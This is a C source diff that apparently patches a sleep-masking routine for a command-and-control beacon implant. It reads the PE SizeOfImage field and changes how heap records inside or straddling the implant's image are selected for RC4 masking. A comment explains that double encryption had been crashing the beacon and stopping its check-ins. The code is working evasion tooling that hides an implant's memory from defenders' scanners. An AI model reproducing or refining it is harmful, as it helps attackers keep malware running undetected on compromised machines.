@@ -196,6 +196,7 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 	DWORD * sec;
 	int n = 0;
 	DWORD text_va = 0, text_end = 0;
+	DWORD sizeimg = 0;
 
 	g3_log("snap: beacon_ptr", (long)(long long)parms.beacon_ptr);
 	g3_log("snap: sections", (long)(long long)parms.sections);
@@ -219,6 +220,7 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 		WORD optsz = *(WORD *)(pe + lfanew + 20);
 		DWORD secoff = lfanew + 24 + optsz;
 		WORD i;
+		sizeimg = *(DWORD *)(pe + lfanew + 24 + 0x38); /* PE32+ SizeOfImage */
 		for (i = 0; i < nsec; i++) {
 			unsigned char * so = pe + secoff + (DWORD)i * 40;
 			if (memcmp(so, ".text", 5) == 0) {
@@ -229,6 +231,8 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 			}
 		}
 	}
+
+	g3_log("snap: sizeimg", (long)sizeimg);
 
 	g3_log("snap: text_va", (long)text_va);
 	g3_log("snap: text_end", (long)text_end);
@@ -256,13 +260,47 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 		}
 	}
 
-	while (n < max && hr != NULL && hr->ptr != NULL) {
-		if (hr->size > 0 && hr->size < 0x40000000) {
-			out[n].ptr = (unsigned char *)hr->ptr;
-			out[n].len = (unsigned long)hr->size;
-			n++;
+	/* Tracked allocations can live INSIDE the image span (round-12
+	 * evidence: six heap chunks at .data/.bss addresses, because the
+	 * EXE-form carrier maps the whole image as one private RWX arena).
+	 * Masking a section AND a heap record over the same bytes
+	 * double-encrypts the overlap: RC4 with per-block keys is not
+	 * order-independent, so the second unmask XORs garbage over the
+	 * first block's restored plaintext (.data died, checkins stopped,
+	 * while the window loop kept running off its stack caches). Records
+	 * inside the image are redundant anyway - the section block already
+	 * covers them - so drop them; a partial straddle keeps only the
+	 * outside fragment. */
+	{
+		unsigned char * img_lo = (unsigned char *)parms.beacon_ptr;
+		unsigned char * img_hi = img_lo + sizeimg;
+		int skipped = 0;
+
+		while (n < max && hr != NULL && hr->ptr != NULL) {
+			unsigned char * hp = (unsigned char *)hr->ptr;
+			unsigned char * he = hp + hr->size;
+
+			if (hr->size > 0 && hr->size < 0x40000000) {
+				if (hp >= img_lo && he <= img_hi) {
+					skipped++;
+					g3_log("snap: skip in-image", (long)(long long)hp);
+				}
+				else {
+					if (hp < img_lo && he > img_lo)
+						he = img_lo; /* head straddle: keep below-image part */
+					if (hp < img_hi && he > img_hi)
+						hp = img_hi; /* tail straddle: keep above-image part */
+					if (hp < he) {
+						out[n].ptr = hp;
+						out[n].len = (unsigned long)(he - hp);
+						n++;
+					}
+				}
+			}
+			hr++;
 		}
-		hr++;
+		if (skipped)
+			g3_log("snap: in-image records skipped", skipped);
 	}
 
 	return n;
